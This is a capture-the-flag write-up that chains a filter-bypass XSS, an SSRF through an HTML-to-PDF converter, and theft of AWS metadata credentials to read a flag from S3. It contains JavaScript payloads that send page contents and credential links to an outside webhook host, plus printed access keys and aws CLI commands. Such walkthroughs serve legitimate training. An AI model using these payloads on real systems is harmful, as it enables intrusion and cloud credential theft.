# Welcoming Hacker As A Service - 300 Points

## Description: 
```We've made a simple application for generating welcome messages for hackers. Feel free to report any bugs you encounter.```

*Link: http://54.180.108.161/*


## Solution:

The home page gets username from user and directly inserts it to the html code. We could try inserting `<script>` tag, but the `script` keyword is removed from the input. We can bypass this by placing script inside the script `<scrscriptipt>` so the program removes the substring script which will become `<script>`.

![XSS](./images/1_XSS.png)

We can submit path containing the XSS payload in `/bugs` page.

There is a hidden page `/admin`, when trying to access it the tells `This is only accessible from the server.` but since we have XSS on the server side we can easily bypass this restriction. We can use the following payload to get the source of `/admin`

```js
// step 1
fetch("/admin")
    .then(
        data => data.text()
    )
    .then(admin => {
        fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
            method: "POST",
            body: JSON.stringify(admin)
        })
    })
```

The admin page simply gets HTML code from the user and renders the page into a pdf. The HTML code is sent to `/admin/convert` api which returns a link to the pdf document.

```js
const form = document.querySelector("#html-form");
const pdfLink = document.querySelector("#pdf-link");

form.addEventListener("submit", function(event) {
        event.preventDefault();
        const htmlCode = document.querySelector("#html-input").value;
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/admin/convert");
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onload = function() {
                if (xhr.status === 200) {
                        const response = JSON.parse(xhr.responseText);
                        pdfLink.innerHTML = `Download your PDF <a href="${response.pdfLink}" target="_blank">here</a>`;
                } else {
                        pdfLink.innerHTML = `Error: ${response.error}`;
                }
        };
        xhr.onerror = function() {
                pdfLink.innerHTML = `Error: ${xhr.statusText}`;
        };
        xhr.send(JSON.stringify({htmlCode: htmlCode}));
});
```

The description of the challenge says that the flag is in s3 bucket, so we must get aws Access keys from the server. We can use the server's html to pdf converting mechanism to leak the aws access key from `http://169.254.169.254/`. I have no experience with aws or s3 so I followed [this writeup](https://world.hey.com/alois/aws-capture-the-flag-write-up-e64fa089) to get the access keys and used the aws cli to get the flag.

Code used to leak aws secrets:
```js
// step 2
const htmlCode = "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/bugbase-sales-team' width='1000px' height='1000px'></iframe>";
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/convert");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onload = function() {
        if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
                    method: "POST",
                    body: response.pdfLink
                })
        }
};
xhr.send(JSON.stringify({htmlCode: htmlCode}));
```

Make sure to copy the session token properly!
```sh
root@68f2a5d7e33f:/# cat ~/.aws/credentials
[bugbase]
aws_access_key_id = ASIA5232YEM3KTZFU2FP
aws_secret_access_key = Vp9U1l09AptRNfyW3d9/6TNQCrsJ/dASr2dliWgR
aws_session_token = IQoJb3JpZ2luX2VjEGwaDmFwLW5vcnRoZWFzdC0yIkgwRg<----snip---->SuULtBtvHNBrM6fLwzoHRv

root@68f2a5d7e33f:/# aws s3 cp s3://bugbase-secret-file-storage/flag.txt . 
--profile bugbase
root@68f2a5d7e33f:/# cat flag.txt
BugBase{m0n3y_c4n7_buy_h4pp1n3ss}

```

Exploit: [Link](./hack.js)

Flag: `BugBase{m0n3y_c4n7_buy_h4pp1n3ss}`